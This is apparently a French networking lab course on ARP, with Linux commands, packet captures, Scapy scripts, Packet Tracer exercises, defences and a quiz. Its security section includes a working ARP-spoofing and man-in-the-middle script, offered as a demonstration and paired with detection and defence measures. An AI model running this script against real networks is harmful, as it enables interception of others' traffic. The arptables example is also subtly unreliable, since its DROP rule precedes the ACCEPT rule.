# TP COMPLET : PROTOCOLES RÉSEAU AVANCÉS
## Partie 1/3 : ARP • DHCP • DNS
### Protocoles Fondamentaux - De Zéro à Expert

**Durée totale estimée :** 30-35 heures (3 parties)  
**Ordre pédagogique :** ARP → DHCP → DNS → NAT → NTP → SSL/TLS → IMAP  
**Environnements :** Terminal Linux + Packet Tracer + GNS3

---

## 📋 ORDRE D'APPRENTISSAGE ET PRÉREQUIS

```
NIVEAU 1 - FONDAMENTAUX (OBLIGATOIRES)
┌─────────────────────────────────────┐
│  1. ARP (Address Resolution)        │  ← Commencer ICI
│     Prérequis: IP, Ethernet         │
├─────────────────────────────────────┤
│  2. DHCP (Configuration auto)       │  ← Nécessite: ARP, IP
│     Prérequis: IP, UDP              │
├─────────────────────────────────────┤
│  3. DNS (Résolution de noms)        │  ← Nécessite: IP, UDP
│     Prérequis: IP, UDP, TCP         │
└─────────────────────────────────────┘
           ↓
NIVEAU 2 - INFRASTRUCTURE
┌─────────────────────────────────────┐
│  4. NAT (Translation d'adresses)    │  ← Nécessite: IP, routage
│     Prérequis: IP, routage, DHCP    │
├─────────────────────────────────────┤
│  5. NTP (Synchronisation temps)     │  ← Nécessite: UDP, réseau stable
│     Prérequis: UDP, DNS             │
└─────────────────────────────────────┘
           ↓
NIVEAU 3 - SÉCURITÉ & APPLICATIONS
┌─────────────────────────────────────┐
│  6. SSL/TLS (Chiffrement)           │  ← Nécessite: TCP, certificats
│     Prérequis: TCP, cryptographie   │
├─────────────────────────────────────┤
│  7. IMAP (Email)                    │  ← Nécessite: TCP, DNS, SSL/TLS
│     Prérequis: TCP, DNS, SSL/TLS    │
└─────────────────────────────────────┘

RAISON DE CET ORDRE:
- ARP est la base de la communication Ethernet
- DHCP configure automatiquement IP (utilise ARP)
- DNS résout les noms (nécessite IP configuré)
- NAT permet le partage d'IP (nécessite routage)
- NTP synchronise le temps (nécessite réseau stable)
- SSL/TLS sécurise (base pour services modernes)
- IMAP utilise tous les précédents
```

---

## 🔵 NIVEAU 1 : ARP (Address Resolution Protocol)

### Objectifs
- Comprendre la résolution adresse IP → MAC
- Maîtriser la table ARP
- Détecter les attaques ARP poisoning
- Configurer ARP dans Packet Tracer

---

### Partie 1.1 : Théorie ARP

#### Exercice 1.1.1 : Comprendre ARP

```
=== QU'EST-CE QUE ARP ? ===

ARP (Address Resolution Protocol) permet de trouver l'adresse MAC
correspondant à une adresse IP sur un réseau local (LAN).

PROBLÈME:
- La couche IP utilise des adresses IP (192.168.1.10)
- La couche Ethernet utilise des adresses MAC (00:11:22:33:44:55)
- Comment associer les deux ?

SOLUTION: ARP !

=== PROCESSUS ARP ===

1. Machine A veut communiquer avec 192.168.1.10
2. A regarde sa table ARP → pas d'entrée
3. A envoie ARP Request (broadcast):
   "Qui a 192.168.1.10 ? Dis-le à 192.168.1.5 (moi)"
4. Toutes les machines reçoivent le broadcast
5. Machine avec IP 192.168.1.10 répond (unicast):
   "C'est moi ! Mon MAC est 00:11:22:33:44:55"
6. A met à jour sa table ARP
7. Communication possible !

=== TYPES DE MESSAGES ARP ===

ARP Request  (opcode 1): "Qui a cette IP ?"
ARP Reply    (opcode 2): "Moi ! Voici mon MAC"
RARP Request (opcode 3): "Quelle est mon IP ?" (obsolète)
RARP Reply   (opcode 4): "Ton IP est..." (obsolète)

=== FORMAT PAQUET ARP ===

 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Hardware Type         |        Protocol Type          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| HW Addr Len   | Proto Addr Len|           Opcode              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Sender Hardware Address                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Sender Protocol Address                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Target Hardware Address                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Target Protocol Address                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Hardware Type: 1 (Ethernet)
Protocol Type: 0x0800 (IPv4)
```

---

#### Exercice 1.1.2 : Manipulation de la table ARP (Linux)

```bash
#!/bin/bash
# arp_basics.sh - Commandes ARP de base

echo "=== MANIPULATION TABLE ARP ==="

# 1. Afficher la table ARP
echo "[1] Table ARP actuelle:"
arp -n
# ou
ip neigh show

# 2. Afficher avec noms d'hôtes
echo -e "\n[2] Table ARP avec résolution DNS:"
arp -a

# 3. Afficher pour une interface spécifique
echo -e "\n[3] ARP pour eth0:"
arp -i eth0

# 4. Vider la table ARP (nécessite root)
echo -e "\n[4] Vider la table ARP:"
sudo ip neigh flush all

# 5. Ajouter une entrée ARP statique
echo -e "\n[5] Ajouter entrée statique:"
sudo arp -s 192.168.1.100 00:11:22:33:44:55
# ou
sudo ip neigh add 192.168.1.100 lladdr 00:11:22:33:44:55 dev eth0

# 6. Supprimer une entrée
echo -e "\n[6] Supprimer une entrée:"
sudo arp -d 192.168.1.100
# ou
sudo ip neigh del 192.168.1.100 dev eth0

# 7. Forcer une requête ARP (ping)
echo -e "\n[7] Forcer ARP avec ping:"
ping -c 1 192.168.1.1
arp -n | grep 192.168.1.1

# 8. États des entrées ARP
echo -e "\n[8] États possibles:"
cat << 'EOF'
PERMANENT - Entrée statique (ne expire jamais)
NOARP     - Pas d'ARP pour cette entrée
REACHABLE - Entrée valide et récente
STALE     - Entrée valide mais ancienne
DELAY     - En attente de confirmation
PROBE     - Envoi de sondes ARP
INCOMPLETE - Résolution ARP en cours
FAILED    - Résolution ARP échouée
EOF

# 9. Afficher statistiques détaillées
echo -e "\n[9] Statistiques détaillées:"
ip -s neigh show

# 10. Monitoring en temps réel
echo -e "\n[10] Monitoring en temps réel (Ctrl+C pour arrêter):"
# watch -n 1 'ip neigh show'
```

```bash
chmod +x arp_basics.sh
./arp_basics.sh
```

---

#### Exercice 1.1.3 : Capture et analyse ARP

```bash
#!/bin/bash
# arp_capture.sh - Capturer le trafic ARP

INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)

echo "=== CAPTURE TRAFIC ARP ==="
echo "Interface: $INTERFACE"

# Vider le cache ARP pour forcer des requêtes
sudo ip neigh flush all

# Démarrer la capture
echo "Démarrage capture (10 secondes)..."
sudo tcpdump -i $INTERFACE arp -w arp_capture.pcap -c 20 &
TCPDUMP_PID=$!

sleep 1

# Générer du trafic ARP
echo "Génération de trafic ARP..."
for ip in {1..10}; do
    ping -c 1 -W 1 192.168.1.$ip > /dev/null 2>&1 &
done

sleep 10
sudo kill $TCPDUMP_PID 2>/dev/null

# Analyser la capture
echo -e "\n=== ANALYSE ==="

# Avec tcpdump
echo "[1] Analyse avec tcpdump:"
tcpdump -r arp_capture.pcap -n -v | head -20

# Avec tshark
echo -e "\n[2] Analyse avec tshark:"
tshark -r arp_capture.pcap -Y "arp" -T fields \
    -e frame.number \
    -e arp.opcode \
    -e arp.src.hw_mac \
    -e arp.src.proto_ipv4 \
    -e arp.dst.proto_ipv4

# Statistiques
echo -e "\n[3] Statistiques:"
echo "ARP Requests: $(tshark -r arp_capture.pcap -Y 'arp.opcode==1' 2>/dev/null | wc -l)"
echo "ARP Replies:  $(tshark -r arp_capture.pcap -Y 'arp.opcode==2' 2>/dev/null | wc -l)"

echo -e "\nCapture sauvegardée: arp_capture.pcap"
```

---

#### Exercice 1.1.4 : Créer des paquets ARP avec Scapy

```python
#!/usr/bin/env python3
# arp_scapy.py - Manipulation ARP avec Scapy

from scapy.all import *
import sys

def arp_request(target_ip):
    """Envoyer une requête ARP"""
    print(f"[*] Envoi ARP Request pour {target_ip}")
    
    # Créer le paquet ARP
    arp = ARP(op=1, pdst=target_ip)  # op=1 : Request
    
    # Créer la trame Ethernet (broadcast)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combiner et envoyer
    packet = ether/arp
    
    # Afficher le paquet
    packet.show()
    
    # Envoyer et attendre réponse
    answered, unanswered = srp(packet, timeout=2, verbose=False)
    
    if answered:
        for sent, received in answered:
            print(f"\n[+] {received[ARP].psrc} est à {received[ARP].hwsrc}")
            return received[ARP].hwsrc
    else:
        print(f"[-] Pas de réponse pour {target_ip}")
        return None

def arp_reply(target_ip, target_mac, source_ip, source_mac):
    """Envoyer une réponse ARP (ARP spoofing)"""
    print(f"[*] Envoi ARP Reply : {source_ip} est à {source_mac}")
    
    # Créer un ARP Reply
    arp = ARP(op=2,  # op=2 : Reply
             pdst=target_ip,
             hwdst=target_mac,
             psrc=source_ip,
             hwsrc=source_mac)
    
    # Envoyer
    send(arp, verbose=False)
    print("[+] ARP Reply envoyé")

def arp_scan(network):
    """Scanner un réseau avec ARP"""
    print(f"[*] Scan ARP du réseau {network}")
    
    # Créer requête ARP pour tout le réseau
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Envoyer et collecter réponses
    result = srp(packet, timeout=3, verbose=False)[0]
    
    # Afficher résultats
    devices = []
    print("\n" + "="*60)
    print(f"{'IP Address':<20}{'MAC Address':<20}{'Vendor'}")
    print("="*60)
    
    for sent, received in result:
        ip = received[ARP].psrc
        mac = received[ARP].hwsrc
        
        # Tenter d'identifier le vendeur (simplifié)
        vendor = "Unknown"
        
        print(f"{ip:<20}{mac:<20}{vendor}")
        devices.append({'ip': ip, 'mac': mac})
    
    print("="*60)
    print(f"Total: {len(devices)} dispositifs trouvés")
    
    return devices

def arp_monitor(interface='eth0', duration=30):
    """Monitorer le trafic ARP"""
    print(f"[*] Monitoring ARP sur {interface} pendant {duration}s")
    print("    Ctrl+C pour arrêter\n")
    
    def arp_callback(packet):
        if ARP in packet:
            if packet[ARP].op == 1:  # Request
                print(f"[REQUEST] Qui a {packet[ARP].pdst}? "
                      f"Dis-le à {packet[ARP].psrc}")
            elif packet[ARP].op == 2:  # Reply
                print(f"[REPLY]   {packet[ARP].psrc} est à "
                      f"{packet[ARP].hwsrc}")
    
    try:
        sniff(iface=interface, prn=arp_callback, 
              filter="arp", timeout=duration, store=False)
    except KeyboardInterrupt:
        print("\n[*] Monitoring arrêté")

def detect_arp_spoofing():
    """Détecter ARP spoofing"""
    print("[*] Détection ARP spoofing active...")
    print("    Recherche de MAC dupliqués\n")
    
    arp_table = {}
    
    def check_packet(packet):
        if ARP in packet and packet[ARP].op == 2:  # Reply
            ip = packet[ARP].psrc
            mac = packet[ARP].hwsrc
            
            if ip in arp_table:
                if arp_table[ip] != mac:
                    print(f"[!] ALERTE ARP SPOOFING!")
                    print(f"    IP: {ip}")
                    print(f"    MAC ancien: {arp_table[ip]}")
                    print(f"    MAC nouveau: {mac}\n")
            else:
                arp_table[ip] = mac
                print(f"[+] Nouvelle entrée: {ip} -> {mac}")
    
    try:
        sniff(prn=check_packet, filter="arp", store=False)
    except KeyboardInterrupt:
        print("\n[*] Détection arrêtée")

def main():
    if os.geteuid() != 0:
        print("Ce script nécessite les privilèges root (sudo)")
        sys.exit(1)
    
    import argparse
    
    parser = argparse.ArgumentParser(description='Outils ARP avec Scapy')
    parser.add_argument('--request', metavar='IP', 
                       help='Envoyer ARP request')
    parser.add_argument('--scan', metavar='NETWORK', 
                       help='Scanner réseau (ex: 192.168.1.0/24)')
    parser.add_argument('--monitor', action='store_true',
                       help='Monitorer trafic ARP')
    parser.add_argument('--detect-spoofing', action='store_true',
                       help='Détecter ARP spoofing')
    parser.add_argument('--interface', default='eth0',
                       help='Interface réseau')
    
    args = parser.parse_args()
    
    if args.request:
        arp_request(args.request)
    elif args.scan:
        arp_scan(args.scan)
    elif args.monitor:
        arp_monitor(args.interface)
    elif args.detect_spoofing:
        detect_arp_spoofing()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
```

**Utilisation :**
```bash
chmod +x arp_scapy.py

# Requête ARP simple
sudo python3 arp_scapy.py --request 192.168.1.1

# Scanner le réseau
sudo python3 arp_scapy.py --scan 192.168.1.0/24

# Monitorer ARP
sudo python3 arp_scapy.py --monitor --interface eth0

# Détecter spoofing
sudo python3 arp_scapy.py --detect-spoofing
```

---

### Partie 1.2 : ARP dans Packet Tracer

#### Exercice 1.2.1 : Topologie ARP simple

```
=== TOPOLOGIE PACKET TRACER - ARP ===

Créer cette topologie dans Packet Tracer:

    PC1                 PC2
     │                   │
192.168.1.10      192.168.1.20
     │                   │
     └─────── Switch ────┘
          (Switch0)

Configuration:
1. PC1: IP 192.168.1.10/24
2. PC2: IP 192.168.1.20/24
3. Switch: Configuration par défaut

EXERCICES:

1. Vérifier table ARP vide
   PC1> arp -a

2. Ping de PC1 vers PC2
   PC1> ping 192.168.1.20

3. Observer table ARP mise à jour
   PC1> arp -a

4. Vider table ARP
   PC1> arp -d

5. Capturer trafic sur Switch
   - Simulation Mode
   - Observer ARP Request/Reply

6. Analyser les paquets ARP
   - Cliquer sur paquet ARP
   - Observer les champs
```

**Instructions Packet Tracer :**

```
=== CONFIGURATION DÉTAILLÉE ===

1. Ajouter composants:
   - 2 PC (End Devices > PC)
   - 1 Switch 2960 (Switches > 2960)

2. Connecter avec câbles Cuivre Droit:
   - PC1 FastEthernet0 → Switch FastEthernet0/1
   - PC2 FastEthernet0 → Switch FastEthernet0/2

3. Configurer PC1:
   - Desktop > IP Configuration
   - IP Address: 192.168.1.10
   - Subnet Mask: 255.255.255.0

4. Configurer PC2:
   - Desktop > IP Configuration
   - IP Address: 192.168.1.20
   - Subnet Mask: 255.255.255.0

5. Tester:
   - Desktop > Command Prompt
   - PC1> ping 192.168.1.20

6. Mode Simulation:
   - Cliquer sur "Simulation" (en bas à droite)
   - Edit Filters > Afficher seulement ARP et ICMP
   - PC1> ping 192.168.1.20
   - Cliquer "Auto Capture/Play" pour voir animation
   - Observer les paquets ARP Request (broadcast)
   - Observer les paquets ARP Reply (unicast)

7. Analyser les paquets:
   - Dans Event List, cliquer sur carré coloré
   - Observer OSI Model et PDU Information
   - Noter: Destination MAC ff:ff:ff:ff:ff:ff (broadcast)
```

---

#### Exercice 1.2.2 : Topologie multi-VLAN (Gratuitous ARP)

```
=== TOPOLOGIE AVEC ROUTEUR ===

    PC1           Router           PC2
     │              │               │
192.168.1.10   Gig0/0  Gig0/1  192.168.2.10
     │         .1    .1             │
     │              │               │
  Switch0        Router0         Switch1
   VLAN 10                        VLAN 20

CONFIGURATION ROUTEUR:

Router> enable
Router# configure terminal
Router(config)# interface GigabitEthernet0/0
Router(config-if)# ip address 192.168.1.1 255.255.255.0
Router(config-if)# no shutdown
Router(config-if)# exit

Router(config)# interface GigabitEthernet0/1
Router(config-if)# ip address 192.168.2.1 255.255.255.0
Router(config-if)# no shutdown
Router(config-if)# exit

OBSERVER:
- PC1 ping 192.168.2.10
- ARP pour gateway (192.168.1.1)
- Router fait proxy ARP entre réseaux
```

---

### Partie 1.3 : Sécurité ARP

#### Exercice 1.3.1 : ARP Spoofing Attack (démonstration)

```python
#!/usr/bin/env python3
# arp_spoofing_demo.py - Démonstration ARP spoofing (ÉDUCATIF)

from scapy.all import *
import time
import sys

def get_mac(ip):
    """Obtenir MAC d'une IP"""
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    result = srp(packet, timeout=3, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, interface='eth0'):
    """Effectuer ARP spoofing"""
    
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Impossible de trouver MAC pour {target_ip}")
        return
    
    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Spoofing {spoof_ip} vers {target_ip}")
    print("[*] Ctrl+C pour arrêter\n")
    
    packet_count = 0
    
    try:
        while True:
            # Créer paquet ARP Reply malveillant
            arp = ARP(op=2,  # Reply
                     pdst=target_ip,
                     hwdst=target_mac,
                     psrc=spoof_ip,
                     hwsrc=get_if_hwaddr(interface))
            
            send(arp, verbose=False)
            packet_count += 1
            
            print(f"\r[*] Paquets envoyés: {packet_count}", end='')
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n[*] Arrêt du spoofing")
        print("[*] Restauration ARP...")
        restore(target_ip, spoof_ip, interface)

def restore(target_ip, spoof_ip, interface='eth0'):
    """Restaurer l'ARP légitime"""
    
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    
    if target_mac and spoof_mac:
        arp = ARP(op=2,
                 pdst=target_ip,
                 hwdst=target_mac,
                 psrc=spoof_ip,
                 hwsrc=spoof_mac)
        
        send(arp, count=5, verbose=False)
        print("[+] Table ARP restaurée")

def mitm_attack(target_ip, gateway_ip, interface='eth0'):
    """Attaque Man-in-the-Middle"""
    
    print("="*60)
    print("ATTENTION: Ceci est une DÉMONSTRATION")
    print("N'utilisez ceci QUE sur votre propre réseau de test!")
    print("="*60)
    print()
    
    # Activer le forwarding IP
    print("[*] Activation IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[-] Impossible de résoudre les adresses MAC")
        return
    
    print(f"[+] Target: {target_ip} ({target_mac})")
    print(f"[+] Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] Démarrage MITM...\n")
    
    try:
        while True:
            # Spoof target: faire croire que nous sommes la gateway
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=get_if_hwaddr(interface)),
                 verbose=False)
            
            # Spoof gateway: faire croire que nous sommes la target
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=get_if_hwaddr(interface)),
                 verbose=False)
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Arrêt MITM")
        print("[*] Restauration...")
        
        # Restaurer
        restore(target_ip, gateway_ip, interface)
        restore(gateway_ip, target_ip, interface)
        
        # Désactiver forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Réseau restauré")

def main():
    if os.geteuid() != 0:
        print("Nécessite root (sudo)")
        sys.exit(1)
    
    import argparse
    
    parser = argparse.ArgumentParser(
        description='ARP Spoofing Demo (ÉDUCATIF UNIQUEMENT)'
    )
    parser.add_argument('--target', required=True, 
                       help='IP cible')
    parser.add_argument('--spoof', required=True,
                       help='IP à usurper')
    parser.add_argument('--mitm', action='store_true',
                       help='Mode Man-in-the-Middle')
    parser.add_argument('--interface', default='eth0',
                       help='Interface réseau')
    
    args = parser.parse_args()
    
    if args.mitm:
        mitm_attack(args.target, args.spoof, args.interface)
    else:
        spoof(args.target, args.spoof, args.interface)

if __name__ == "__main__":
    main()
```

**AVERTISSEMENT :**
```
⚠️  UTILISATION ÉDUCATIVE UNIQUEMENT
- N'utilisez ces scripts que sur VOTRE réseau de test
- L'ARP spoofing est ILLÉGAL sur des réseaux non autorisés
- Utilisez uniquement pour apprendre et sécuriser vos réseaux
```

---

#### Exercice 1.3.2 : Défense contre ARP spoofing

```bash
#!/bin/bash
# arp_defense.sh - Protections contre ARP spoofing

echo "=== DÉFENSES CONTRE ARP SPOOFING ==="

# 1. Entrées ARP statiques (pour serveurs critiques)
echo "[1] Configurer entrées ARP statiques:"
cat << 'EOF'
# Ajouter dans /etc/rc.local ou script de démarrage
arp -s 192.168.1.1 00:11:22:33:44:55  # Gateway
arp -s 192.168.1.100 aa:bb:cc:dd:ee:ff  # Serveur
EOF

# 2. Utiliser ArpON (ARP handler inspection)
echo -e "\n[2] Installer ArpON:"
sudo apt install arpon -y

# Configuration ArpON
sudo tee /etc/default/arpon << 'ARPON'
# SARPI mode (Static ARP Inspection)
DAEMON_OPTS="-d -f /var/log/arpon/arpon.log -s"
ARPON

sudo systemctl start arpon
sudo systemctl enable arpon

# 3. Configurer arpwatch (monitoring ARP)
echo -e "\n[3] Installer arpwatch:"
sudo apt install arpwatch -y

# Configuration
sudo tee /etc/arpwatch.conf << 'ARPWATCH'
# Interface à surveiller
eth0
ARPWATCH

sudo systemctl start arpwatch
sudo systemctl enable arpwatch

# arpwatch envoie des emails en cas de changement MAC

# 4. Script de monitoring personnalisé
cat << 'SCRIPT' > /usr/local/bin/arp_monitor.sh
#!/bin/bash
# Monitoring ARP simple

LOG="/var/log/arp_monitor.log"
ALERT_EMAIL="admin@example.com"

while true; do
    # Capturer table ARP
    current=$(ip neigh show | sort)
    
    # Comparer avec précédente
    if [ -f /tmp/arp_previous ]; then
        diff <(cat /tmp/arp_previous) <(echo "$current") > /tmp/arp_diff
        
        if [ -s /tmp/arp_diff ]; then
            echo "[$(date)] Changement ARP détecté:" >> $LOG
            cat /tmp/arp_diff >> $LOG
            
            # Optionnel: envoyer alerte
            # mail -s "ARP Change Alert" $ALERT_EMAIL < /tmp/arp_diff
        fi
    fi
    
    echo "$current" > /tmp/arp_previous
    sleep 60
done
SCRIPT

chmod +x /usr/local/bin/arp_monitor.sh

# 5. Configuration pare-feu (arptables)
echo -e "\n[5] Configurer arptables:"
sudo apt install arptables -y

# Bloquer ARP replies non sollicitées
sudo arptables -A INPUT -j DROP --opcode Reply

# Autoriser seulement des MAC spécifiques
sudo arptables -A INPUT -s 00:11:22:33:44:55 -j ACCEPT

# 6. DAI (Dynamic ARP Inspection) sur switches managés
echo -e "\n[6] Configuration DAI (sur switch Cisco):"
cat << 'CISCO'
! Activer DAI sur VLAN
Switch(config)# ip arp inspection vlan 10

! Configurer interfaces de confiance (uplinks, serveurs)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip arp inspection trust

! Limiter le taux de paquets ARP
Switch(config-if)# ip arp inspection limit rate 15

! Vérifier
Switch# show ip arp inspection
CISCO

echo -e "\n✓ Défenses configurées"
echo "Logs: /var/log/arpon/, /var/log/arpwatch.log"
```

---

### 🎯 QUIZ ARP

1. À quoi sert ARP ?
2. Quelle est la différence entre ARP Request et ARP Reply ?
3. Pourquoi ARP Request est-il en broadcast ?
4. Qu'est-ce qu'un Gratuitous ARP ?
5. Comment fonctionne une attaque ARP spoofing ?
6. Qu'est-ce que DAI (Dynamic ARP Inspection) ?
7. Quelle est la commande pour vider la table ARP ?
8. Pourquoi les entrées ARP expirent-elles ?

**Réponses attendues :**
1. Résoudre IP → MAC sur un LAN
2. Request demande le MAC, Reply le fournit
3. Pour atteindre tous les hôtes du segment
4. ARP pour annoncer sa propre IP/MAC (détection IP dupliquée)
5. Envoyer de faux ARP replies pour usurper une identité
6. Fonction de switch validant les paquets ARP
7. `ip neigh flush all` ou `arp -d`
8. Pour éviter les entrées obsolètes (timeout ~5min)

---

**[SUITE AVEC DHCP DANS LE PROCHAIN FICHIER...]**

Durée Niveau ARP : 4-5 heures
